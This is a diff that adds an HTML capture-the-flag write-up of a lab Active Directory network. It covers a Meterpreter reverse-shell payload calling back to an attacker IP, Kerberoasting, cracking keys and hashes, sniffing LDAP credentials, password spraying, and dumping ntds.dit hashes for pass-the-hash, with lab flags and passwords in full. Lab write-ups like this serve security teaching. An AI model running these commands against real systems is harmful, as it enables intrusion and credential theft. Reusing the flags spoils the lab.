+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 2 — Deploy</div><div class="flag-value">XEN{7ru573d_1n574ll3r5}</div></div>
+
+<p>The flag name "7ru573d_1n574ll3r5" (trusted installers) is a direct reference to the AlwaysInstallElevated misconfiguration that allowed us to escalate privileges by trusting all MSI installers to run with elevated permissions.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="ghost">Flag 3 — Ghost: Kerberoasting &amp; SMB Pivot</h2>
+
+<h3 id="meterpreter">Establishing a Meterpreter Session</h3>
+
+<p>To facilitate pivoting and tunnel management through the internal network, we switch from the basic netcat shell to a Meterpreter session. While tools like Chisel can accomplish the same tunneling goals, Metasploit's autoroute and SOCKS proxy modules provide a faster and more streamlined experience, especially when competing with other players for Citrix desktop time. We generate a reverse TCP Meterpreter payload and execute it on the Citrix desktop:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Generate Meterpreter payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.14.15.41 LPORT=443 -f exe -o shell_443.exe
+
+# Start handler in MSF
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 10.14.15.41
+msf5 exploit(multi/handler) > run
+
+[*] Sending stage (201283 bytes) to 10.13.38.15
+[*] Meterpreter session 1 opened (10.14.15.41:443 -> 10.13.38.15:50715)
+
+# Escalate to SYSTEM via AlwaysInstallElevated
+msf5 exploit(windows/local/always_install_elevated) > set SESSION 1
+msf5 exploit(windows/local/always_install_elevated) > run
+
+[*] Uploading the MSI...
+[*] Sending stage (176195 bytes) to 10.13.38.15
+[*] Meterpreter session 2 opened (10.14.15.41:443 -> 10.13.38.15:50717)
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM</code></pre>
+</div>
+
+<h3 id="kerberoast">Kerberoasting the Domain</h3>
+
+<p>With SYSTEM access on a domain-joined machine, we can now attack the Active Directory domain. First, we need the Domain Controller's IP address. A simple <code>ping dc</code> resolves the hostname and reveals the DC is at <code>172.16.249.200</code>. Next, we establish routing through the Meterpreter session using Metasploit's autoroute module, which tells the framework to route traffic destined for the internal subnet through our compromised session. Then we start a SOCKS4a proxy to allow external tools to reach the internal network:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Add route through Meterpreter session
+msf5 post(multi/manage/autoroute) > set SESSION 2
+msf5 post(multi/manage/autoroute) > run
+
+[+] Route added to subnet 10.13.38.0/255.255.255.0
+[+] Route added to subnet 172.16.249.0/255.255.255.0
+
+# Start SOCKS4a proxy
+msf5 auxiliary(server/socks4a) > set SRVPORT 1080
+msf5 auxiliary(server/socks4a) > run
+[*] Starting the socks4a proxy server</code></pre>
+</div>
+
+<p>With the proxy running, we can use <code>proxychains</code> to tunnel impacket tools directly to the Domain Controller. The Kerberoasting attack requests a Service Principal Name (SPN) ticket for any account with an SPN registered, and the resulting TGS ticket is encrypted with the service account's NTLM hash. By requesting the ticket and cracking it offline, we recover the service account's password without ever touching the DC directly:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Kerberoast through proxy
+proxychains GetUserSPNs.py -request -dc-ip 172.16.249.200 \
+  HTB.LOCAL/pmorgan:Summer1Summer! -save -outputfile GetUserSPNs.out
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.19-dev
+
+ServicePrincipalName                   Name     MemberOf
+--------------------------------------  -------  ---------------------------------------
+MSSQLSvc/CITRIXTEST.HTB.LOCAL:1433    mturner  CN=Deployment,OU=Groups,DC=htb,DC=local</code></pre>
+</div>
+
+<p>The Kerberoast returns a hash for the <code>mturner</code> account, which has an SPN registered for a MSSQL service on CITRIXTEST. This is a service account with a potentially weak password, making it an excellent target for offline cracking.</p>
+
+<h3 id="crack-kerberoast">Cracking the Kerberoast Hash</h3>
+
+<p>Standard dictionary attacks with <code>rockyou.txt</code> fail to crack the hash, which suggests the password is not a common word or phrase. However, applying Hashcat's <code>dive.rule</code> mutation rules to <code>rockyou.txt</code> dramatically expands the keyspace by applying transformations like capitalization, leet-speak substitutions, and appending numbers and symbols. After approximately 7 hours of cracking, the password is recovered:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Crack with hashcat using rockyou + dive rules
+hashcat -a 0 -m 13100 GetUserSPNs.out \
+  /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/dive.rule --force
+
+$krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/...:4install!
+
+Session..........: hashcat
+Status...........: Cracked
+Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule)</code></pre>
+</div>
+
+<div class="callout callout-info">
+  <div class="callout-title">New Credentials</div>
+  <p><strong>mturner / 4install!</strong> — This service account has an SPN for MSSQL on CITRIXTEST and is a member of the Deployment group. These credentials will be essential for accessing additional resources on the network.</p>
+</div>
+
+<h3 id="smb-access">SMB Access on CITRIX Server</h3>
+
+<p>Using PowerView's <code>Get-DomainComputer</code> from the Meterpreter session, we enumerate the machines in the domain and build a map of the internal network. The active hosts include DC, CITRIX, NETSCALER, and the three VDESKTOP machines, all on 172.16.249.0/24. With the mturner credentials, we test SMB access against the CITRIX server at 172.16.249.201:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Verify SMB access with mturner creds
+proxychains crackmapexec smb 172.16.249.201 -u mturner -p '4install!'
+
+SMB 172.16.249.201 445 CITRIX [+] htb.local\mturner:4install!
+
+# List shares on CITRIX
+net view /all \\citrix
+
+Share name   Type     Used as   Comment
+-----------------------------------------------------------
+ADMIN$       Disk     Remote Admin
+C$           Disk     Default share
+Citrix$      Disk
+IPC$         IPC      Remote IPC
+ISOs         Disk
+ISOs-TEST    Disk</code></pre>
+</div>
+
+<p>The <code>Citrix$</code> share is particularly interesting — it is a hidden share (indicated by the $ suffix) that is not visible during normal browsing. Accessing it reveals several files including a flag, a PuTTY private key file (<code>private.ppk</code>), and PDF documentation about XenServer:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">net use \\citrix\citrix$ /u:mturner 4install!
+dir \\citrix\citrix$
+
+02/12/2019  07:21 PM    997,001  Deploying-XenServer-5.6.pdf
+03/31/2019  11:25 AM        20  flag.txt
+05/08/2019  06:21 PM     1,486  private.ppk
+02/12/2019  07:21 PM 1,747,587  XenServer-5-6-SHG.pdf
+
+type \\citrix\citrix$\flag.txt
+XEN{l364cy_5pn5_ftw}</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 3 — Ghost</div><div class="flag-value">XEN{l364cy_5pn5_ftw}</div></div>
+
+<p>The flag name "l364cy_5pn5_ftw" (legacy SPNs for the win) celebrates the fact that the legacy Service Principal Name on the mturner account made it vulnerable to Kerberoasting. The <code>private.ppk</code> file and XenServer documentation PDFs hint that the next target is the NetScaler device, which acts as the network gateway.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="camouflage">Flag 4 — Camouflage: NetScaler &amp; PCAP Analysis</h2>
+
+<h3 id="ppk-crack">Cracking the PPK Key Passphrase</h3>
+
+<p>The <code>private.ppk</code> file found on the Citrix$ share is a PuTTY-format SSH private key, but it is encrypted with a passphrase. Converting it to an OpenSSH-format key with <code>puttygen</code> requires the correct passphrase. We extract the hash in a format suitable for John the Ripper using <code>putty2john</code>, and then attempt to crack it. Standard wordlists like <code>rockyou.txt</code> fail even with mutation rules, which suggests the passphrase is not a dictionary word but rather a keyboard-walk pattern:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Convert PPK hash for John
+putty2john private.ppk > private.ppk.john
+
+# Standard wordlists fail
+john private.ppk.john --wordlist=/usr/share/wordlists/rockyou.txt
+# No hits
+
+# Use kwprocessor to generate keyboard-walk wordlist
+cd /opt/kwprocessor
+./kwp basechars/full.base keymaps/en-us.keymap \
+  routes/2-to-16-max-3-direction-changes.route \
+  > ~/keyboard_walks.txt
+
+wc -l ~/keyboard_walks.txt
+65758 keyboard_walks.txt
+
+# Crack with keyboard-walk wordlist
+john private.ppk.john --wordlist=~/keyboard_walks.txt
+
+=-09876567890-=-  (private)
+1g 0:00:00:00 DONE
+
+Session completed</code></pre>
+</div>
+
+<p>The <code>kwprocessor</code> tool from the Hashcat team generates wordlists of keyboard-walk patterns — passwords created by tracing paths across a keyboard layout. The passphrase <code>=-09876567890-=</code> is a perfect example: it traces a horizontal arc across the top number row of the keyboard, a pattern that is common in corporate environments but rarely appears in standard wordlists. This is why mutation rules on dictionary files failed while keyboard-walk generation succeeded.</p>
+
+<p>With the passphrase recovered, we can convert the PPK key to an OpenSSH format and use it for SSH access:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Convert PPK to OpenSSH key (save without passphrase)
+puttygen private.ppk -O private-openssh -o xen_key.pem -P
+Enter passphrase to load key: =-09876567890-=
+Enter passphrase to save key: [blank]
+chmod 600 xen_key.pem</code></pre>
+</div>
+
+<h3 id="netscaler-ssh">SSH Access to NetScaler</h3>
+
+<p>Using the converted SSH key, we attempt to connect to the NetScaler device at 172.16.249.202. Regular domain users like <code>mturner</code> connect but land in a restricted Citrix CLI shell without access to the <code>shell</code> command. However, the default NetScaler administrative user <code>nsroot</code> has full privileges, including access to the underlying FreeBSD shell:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># SSH as nsroot with the cracked key
+proxychains ssh -i xen_key.pem nsroot@172.16.249.202
+
+##############################################################################
+# WARNING: Access to this system is for authorized users only
+##############################################################################
+
+Last login: Wed May 8 23:23:15 2019 from 172.16.249.201
+Done
+
+# Escaping the Citrix CLI to FreeBSD shell
+> shell
+
+Copyright (c) 1992-2013 The FreeBSD Project.
+root@netscaler#</code></pre>
+</div>
+
+<p>We now have root access on the NetScaler device, which runs FreeBSD. The NetScaler is positioned as a network gateway between the external and internal networks, meaning all traffic flowing between segments passes through this device. This makes it an ideal position for network traffic capture.</p>
+
+<h3 id="pcap-capture">Network Traffic Capture</h3>
+
+<p>Since the NetScaler sits at a critical network intersection, capturing traffic on its interfaces can reveal credentials and other sensitive data passing between internal hosts. We use <code>tcpdump</code> to capture full packets on interface 1, excluding SSH traffic to reduce noise, and write the output to a PCAP file. After letting the capture run for a short period to accumulate traffic, we transfer the file back to our attack machine for analysis:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Start packet capture on NetScaler (background)
+tcpdump -i 1 -w .capture.pcap -s 0 'not tcp port 22' &
+
+# Wait for traffic to accumulate...
+ls -l .capture.pcap
+-rw-r--r--  1 root  wheel  262144 May 17 06:04 .capture.pcap
+
+# Stop the capture
+kill %1
+
+# Transfer PCAP to attacker machine via SCP
+proxychains scp -i xen_key.pem \
+  nsroot@172.16.249.202:/root/.capture.pcap ./xen_capture.pcap
+
+.d.pcap  100%  318KB  182.6KB/s  00:01</code></pre>
+</div>
+
+<h3 id="pcap-analysis">PCAP Analysis with Wireshark</h3>
+
+<p>Opening the PCAP file in Wireshark reveals traffic on several interesting ports. The most significant finding is LDAP traffic (port 389) between the NetScaler and the Domain Controller, and HTTP traffic (port 80) between the NetScaler and the Citrix server. Both protocols transmit data in plaintext, making them rich sources of credential leakage:</p>
+
+<p><strong>HTTP Traffic</strong> — The HTTP stream contains a POST request that includes a flag directly in the request body. This flag was likely embedded in a web application form submission that was captured in transit:</p>
+
+<div class="flag-box"><div class="flag-label">Flag 4 — Camouflage</div><div class="flag-value">XEN{bu7_ld4p5_15_4_h455l3}</div></div>
+
+<p><strong>LDAP Traffic</strong> — The LDAP streams are even more valuable. Each LDAP bind request transmits credentials in plaintext, and we can extract the username and password for the <code>netscaler-svc</code> service account. This account is used by the NetScaler to authenticate against the domain for LDAP-based authentication queries, and its credentials are <code>netscaler-svc / #S3rvice#@cc</code>.</p>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Critical Credential Leak</div>
+  <p>The LDAP bind DN and password are transmitted in cleartext between the NetScaler and the Domain Controller. This is a common misconfiguration in environments where LDAP signing is not enforced. The <code>netscaler-svc</code> credentials will be the key to the next phase of the attack.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="doppelganger">Flag 5 — Doppelganger: Password Spraying</h2>
+
+<h3 id="bloodhound">BloodHound Analysis</h3>
+
+<p>At this stage, we pivot back to enumeration. Using SharpHound, we had previously collected BloodHound data from the domain. Re-examining it with the new <code>netscaler-svc</code> credentials in context reveals several service accounts in the domain: <code>app-svc</code>, <code>backup-svc</code>, <code>test-svc</code>, <code>netscaler-svc</code>, <code>mssql-svc</code>, <code>xenserver-svc</code>, and <code>print-svc</code>. The flag name "Doppelganger" hints at credential duplication — the same password being reused across multiple service accounts.</p>
+
+<h3 id="password-spray">Password Spray Attack</h3>
+
+<p>Given the flag's hint about shared passwords, we perform a password spray using the <code>netscaler-svc</code> password <code>#S3rvice#@cc</code> against all service accounts. CrackMapExec makes this straightforward by testing a single password against a list of usernames:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Password spray with CrackMapExec
+proxychains crackmapexec smb 172.16.249.201 \
+  -u svc_accounts.txt -p '#S3rvice#@cc' --continue-on-success
+
+SMB 172.16.249.201 445 CITRIX [-] htb.local\app-svc:#S3rvice#@cc STATUS_LOGON_FAILURE
+SMB 172.16.249.201 445 CITRIX [+] htb.local\backup-svc:#S3rvice#@cc
+SMB 172.16.249.201 445 CITRIX [+] htb.local\netscaler-svc:#S3rvice#@cc
+SMB 172.16.249.201 445 CITRIX [+] htb.local\mssql-svc:#S3rvice#@cc
+SMB 172.16.249.201 445 CITRIX [+] htb.local\xenserver-svc:#S3rvice#@cc
+SMB 172.16.249.201 445 CITRIX [+] htb.local\print-svc:#S3rvice#@cc</code></pre>
+</div>
+
+<p>The spray reveals that five out of seven service accounts share the same weak password <code>#S3rvice#@cc</code>. This is a textbook example of credential reuse in enterprise environments, where administrators set the same complex-looking password across multiple service accounts for convenience. The most interesting successful account is <code>backup-svc</code>, because BloodHound shows it has Remote Desktop and WinRM access to the Domain Controller.</p>
+
+<h3 id="rdp-winrm">RDP / WinRM Access to the Domain Controller</h3>
+
+<p>Using the <code>backup-svc</code> credentials, we connect to the Domain Controller at 172.16.249.200 via RDP. The xfreerdp tool works through the proxy chain, providing a full graphical desktop session on the DC. Alternatively, Evil-WinRM provides a PowerShell shell over WinRM (port 5985), which is often faster and more reliable than RDP for command-line operations:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># RDP to Domain Controller
+proxychains xfreerdp /u:backup-svc /p:'#S3rvice#@cc' /v:172.16.249.200
+
+# Or use Evil-WinRM for PowerShell access
+proxychains evil-winrm -u backup-svc -p '#S3rvice#@cc' -i 172.16.249.200
+
+*Evil-WinRM* PS C:\Users\backup-svc\Documents> cd ..\desktop
+*Evil-WinRM* PS C:\Users\backup-svc\desktop> cat flag.txt
+XEN{y_5h4r3d_p@55w0Rd5?}</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 5 — Doppelganger</div><div class="flag-value">XEN{y_5h4r3d_p@55w0Rd5?}</div></div>
+
+<p>The flag name "y_5h4r3d_p@55w0Rd5?" (why shared passwords?) is a pointed commentary on the dangerous practice of credential reuse across service accounts. A single compromised password gave us access to five different accounts, including the one with direct access to the Domain Controller.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="owned">Flag 6 — Owned: Domain Admin Compromise</h2>
+
+<h3 id="backup-privs">SeBackupPrivilege Exploitation</h3>
+
+<p>The <code>backup-svc</code> account is a member of the <strong>Backup Operators</strong> group, which grants two powerful privileges: <code>SeBackupPrivilege</code> (back up files and directories) and <code>SeRestorePrivilege</code> (restore files and directories). These privileges effectively bypass NTFS access control lists, allowing the account to read any file on the system regardless of permissions. The primary target is <code>ntds.dit</code>, the Active Directory database file that stores password hashes for all domain users:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Check group membership and privileges
+net user backup-svc
+
+Local Group Memberships:
+  *Backup Operators    *Remote Desktop Users
+  *Remote Management Users
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+SeBackupPrivilege          Back up files and directories   Enabled
+SeRestorePrivilege         Restore files and directories   Enabled
+SeShutdownPrivilege        Shut down the system            Enabled
+SeChangeNotifyPrivilege    Bypass traverse checking        Enabled</code></pre>
+</div>
+
+<h3 id="diskshadow">Disk Shadow Copy with Diskshadow</h3>
+
+<p>The challenge with extracting <code>ntds.dit</code> is that the file is locked by the NTDS service while the Domain Controller is running, and it cannot be copied directly even with SeBackupPrivilege. The solution is to use Microsoft's <code>diskshadow</code> utility to create a Volume Shadow Copy (VSS snapshot) of the hard drive. The shadow copy is a point-in-time read-only snapshot that exists outside the NTDS file lock, allowing us to access the database file from the snapshot instead of the live volume:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Create a diskshadow script file
+echo set context persistent nowriters > c:\programdata\ds.dsh
+echo add volume c: alias xen >> c:\programdata\ds.dsh
+echo create >> c:\programdata\ds.dsh
+echo expose %xen% u: >> c:\programdata\ds.dsh
+
+# Execute the diskshadow script
+diskshadow /s c:\programdata\ds.dsh
+
+# The shadow copy is now mounted as U: drive
+# ntds.dit can be accessed from U:\Windows\NTDS\ntds.dit</code></pre>
+</div>
+
+<h3 id="copy-ntds">Copying ntds.dit with SeBackupPrivilege</h3>
+
+<p>Even from the shadow copy, standard copy commands may fail due to permission restrictions. We use a custom PowerShell DLL (<code>Copy-FileSeBackupPrivilege</code>) that leverages the SeBackupPrivilege to bypass ACL checks and copy the file. This tool was uploaded to the DC via WinRM and imported into the PowerShell session. The SYSTEM registry hive is also needed to decrypt the hashes from ntds.dit, so we save that as well:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Import SeBackupPrivilege DLL
+Import-Module .\SeBackupPrivilegeCmdlets.dll
+
+# Copy ntds.dit from shadow copy to a network share on 172.16.249.203
+Copy-FileSeBackupPrivilege u:\Windows\ntds\ntds.dit \\172.16.249.203\df\ntds.dit
+
+# Also save the SYSTEM registry hive
+reg save hklm\system \\172.16.249.203\df\system
+
+# Cleanup: unmount the shadow copy
+diskshadow
+DISKSHADOW> delete shadows exposed u:
+DISKSHADOW> exit</code></pre>
+</div>
+
+<p>To transfer the files from the internal network back to our attack machine, we set up a temporary SMB share on one of the Citrix virtual desktops (172.16.249.203) using mturner's credentials, then accessed that share through the proxy chain. The ntds.dit file and SYSTEM hive are both exfiltrated for offline analysis.</p>
+
+<h3 id="dump-hashes">Dumping Domain Hashes</h3>
+
+<p>With both the <code>ntds.dit</code> database and the <code>SYSTEM</code> registry hive, we can extract all domain password hashes using Impacket's <code>secretsdump.py</code>. The tool first uses the SYSTEM hive to derive the encryption keys, then decrypts the password hashes stored in ntds.dit. The output includes the Administrator hash, which is the ultimate prize:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Extract all domain hashes
+secretsdump.py -system system -ntds ntds.dit LOCAL
+
+[*] Target system bootKey: 0x6e398137ec7f2e204671dad7c778509f
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] PEK # 0 found and decrypted: 4a62a0ac1475b54add921ac8c1b72e31
+[*] Reading and decrypting hashes from ntds.dit
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:5e507509602e1b651759527b87b6c347:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3791ca8d70c9e1d2d2c7c5b5c7c253e8:::
+CITRIX$:1103:aad3b435b51404eeaad3b435b51404ee:fd981d0c915932bb3ddf38b415c49121:::
+htb.local\alarsson:1104:aad3b435b51404eeaad3b435b51404ee:92a44f1aa6259c55f9f514fabae5cc3f:::
+htb.local\jmendes:1106:aad3b435b51404eeaad3b435b51404ee:10d0c05f7d958955f0eaf1479b5124a0:::
+htb.local\pmorgan:1107:aad3b435b51404eeaad3b435b51404ee:8618ba932416a7404a854b250bf28577:::
+htb.local\awardel:1108:aad3b435b51404eeaad3b435b51404ee:270e4d446437f4383b092b42a9f88f0a:::</code></pre>
+</div>
+
+<h3 id="domain-admin">Domain Admin Access</h3>
+
+<p>With the Administrator NTLM hash in hand, we can authenticate as the Domain Administrator using Pass-the-Hash. Impacket's <code>wmiexec.py</code> provides a semi-interactive shell on the DC without needing the plaintext password. The hash <code>aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be</code> is used directly for authentication:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Pass-the-Hash to Domain Controller
+proxychains wmiexec.py \
+  -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be \
+  administrator@172.16.249.200
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell
+C:\> whoami
+htb\administrator
+
+C:\> cd users\administrator\desktop
+C:\users\administrator\desktop> type flag.txt
+XEN{d3r1v471v3_d0m41n_4dm1n}</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 6 — Owned</div><div class="flag-value">XEN{d3r1v471v3_d0m41n_4dm1n}</div></div>
+
+<p>The final flag "d3r1v471v3_d0m41n_4dm1n" (derivative domain admin) marks the complete compromise of the Humongous Retail Active Directory domain. We have achieved Domain Administrator access by chaining a series of vulnerabilities and misconfigurations: weak SMTP enumeration, lack of phishing awareness, Citrix environment restrictions with bypass gaps, the AlwaysInstallElevated misconfiguration, a Kerberoastable service account, plaintext LDAP credentials in network traffic, shared service account passwords, and excessive backup privileges on the DC.</p>
+
+<div class="callout callout-success">
+  <div class="callout-title">Domain Compromised</div>
+  <p>The entire XEN lab has been completed. From an external phishing email to Domain Administrator in six methodical steps, the attack path demonstrates how a single entry point can cascade through multiple layers of weak security controls into complete organizational compromise.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="summary">Attack Path Summary</h2>
+
+<div class="attack-path">
+  <div class="step"><span class="arrow">[1]</span> <span class="technique">Nmap + SMTP Enum + Phishing</span> <span class="arrow">&rarr;</span> <span class="cred">pmorgan / Summer1Summer!</span></div>
+  <div class="step"><span class="arrow">[2]</span> <span class="technique">Citrix Login + .bat Bypass + AlwaysInstallElevated + UAC Bypass</span></div>
+  <div class="step"><span class="arrow">[3]</span> <span class="technique">Meterpreter + Autoroute + Kerberoast (mturner / 4install!)</span></div>
+  <div class="step"><span class="arrow">[4]</span> <span class="technique">PPK Crack (kwprocessor) + NetScaler SSH + tcpdump + LDAP Creds</span></div>
+  <div class="step"><span class="arrow">[5]</span> <span class="technique">Password Spray (#S3rvice#@cc) + backup-svc RDP to DC</span></div>
+  <div class="step"><span class="arrow">[6]</span> <span class="technique">SeBackupPrivilege + diskshadow + ntds.dit + secretsdump + DA</span></div>
+</div>
+
+<div class="main-content">
+<table>
+  <thead>
+    <tr><th>Flag</th><th>Phase</th><th>Technique</th><th>Value</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Breach</td><td>Citrix Foothold</td><td>Phishing via SMTP + Citrix VDI</td><td><code>XEN{wh0_n33d5_2f@?}</code></td></tr>
+    <tr><td>Deploy</td><td>Privilege Escalation</td><td>AlwaysInstallElevated + UAC Bypass</td><td><code>XEN{7ru573d_1n574ll3r5}</code></td></tr>
+    <tr><td>Ghost</td><td>Kerberoast + SMB</td><td>SPN attack + mturner hash crack</td><td><code>XEN{l364cy_5pn5_ftw}</code></td></tr>
+    <tr><td>Camouflage</td><td>NetCapture + LDAP</td><td>PPK crack + PCAP + plaintext LDAP</td><td><code>XEN{bu7_ld4p5_15_4_h455l3}</code></td></tr>
+    <tr><td>Doppelganger</td><td>Password Spray</td><td>Credential reuse across svc accounts</td><td><code>XEN{y_5h4r3d_p@55w0Rd5?}</code></td></tr>
+    <tr><td>Owned</td><td>Domain Admin</td><td>SeBackupPrivilege + ntds.dit + PtH</td><td><code>XEN{d3r1v471v3_d0m41n_4dm1n}</code></td></tr>
+  </tbody>
+</table>
+</div>
+
+<div class="callout callout-info">
+  <div class="callout-title">Key Takeaways</div>
+  <p>This lab demonstrates several critical real-world security lessons: (1) SMTP enumeration should be disabled or restricted on internet-facing mail servers; (2) Citrix VDI environments must have proper application whitelisting, not just shortcut restrictions; (3) AlwaysInstallElevated should never be enabled in production; (4) Service accounts with SPNs should use strong, unique passwords and ideally be managed by gMSA; (5) LDAP signing must be enforced to prevent credential leakage in network traffic; (6) Service account passwords must be unique across accounts; (7) Backup Operators membership should be strictly controlled and monitored, as it provides a direct path to domain compromise.</p>
+</div>
+
+</main>
+</div>
+
+<footer class="site-footer">&copy; 2026 QA210 &mdash; Yuri08 Writeups</footer>
+
+<script>
+// ── Copy Button ──
+function copyCode(btn){
+  const code=btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
+  });
+}
+
+// ── Mobile TOC ──
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+
+// ── Build TOC ──
+function buildToc(){
+  const headings=document.querySelectorAll('.main-content h2, .main-content h3');
+  const desktopToc=document.getElementById('tocDesktop');
+  const mobileToc=document.getElementById('tocMobile');
+  if(!desktopToc||!mobileToc) return;
+  headings.forEach(h=>{
+    const li=document.createElement('li');
+    const a=document.createElement('a');
+    a.href='#'+h.id;
+    a.textContent=h.textContent;
+    if(h.tagName==='H3') a.classList.add('toc-h3');
+    a.addEventListener('click',()=>{
+      document.getElementById('tocOverlay').classList.remove('show');
+      document.getElementById('tocMobilePanel').classList.remove('show');
+    });
+    li.appendChild(a);
+    desktopToc.appendChild(li);
+    mobileToc.appendChild(li.cloneNode(true));
+  });
+}
+buildToc();
+
+// ── Active TOC Highlight ──
+const tocLinks=document.querySelectorAll('.toc-sidebar a');
+const contentHeadings=document.querySelectorAll('.main-content h2, .main-content h3');
+function updateActiveToc(){
+  let current='';
+  contentHeadings.forEach(h=>{
+    if(window.scrollY>=h.offsetTop-80) current=h.id;
+  });
+  tocLinks.forEach(a=>{
+    a.classList.toggle('active', a.getAttribute('href')==='#'+current);
+  });
+}
+window.addEventListener('scroll',updateActiveToc);
+updateActiveToc();
+
+// ── Three.js Background — TorusKnot Geometry ──
+(function(){
+  const canvas=document.getElementById('three-bg');
+  const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:true});
+  renderer.setSize(window.innerWidth,window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  const scene=new THREE.Scene();
+  const camera=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,0.1,1000);
+  camera.position.z=6;
+
+  // TorusKnot wireframe
+  const tkGeo=new THREE.TorusKnotGeometry(2,0.5,128,16,2,3);
+  const tkMat=new THREE.MeshBasicMaterial({color:0x00e5ff,wireframe:true,transparent:true,opacity:0.15});
+  const tkMesh=new THREE.Mesh(tkGeo,tkMat);
+  scene.add(tkMesh);
+
+  // Particles
+  const pCount=800;
+  const pGeo=new THREE.BufferGeometry();
+  const pPos=new Float32Array(pCount*3);
+  const pVel=[];
+  for(let i=0;i<pCount;i++){
+    pPos[i*3]=(Math.random()-0.5)*16;
+    pPos[i*3+1]=(Math.random()-0.5)*16;
+    pPos[i*3+2]=(Math.random()-0.5)*10;
+    pVel.push(Math.random()*0.008+0.003);
+  }
+  pGeo.setAttribute('position',new THREE.BufferAttribute(pPos,3));
+  const pMat=new THREE.PointsMaterial({color:0x18ffff,size:0.04,transparent:true,opacity:0.6});
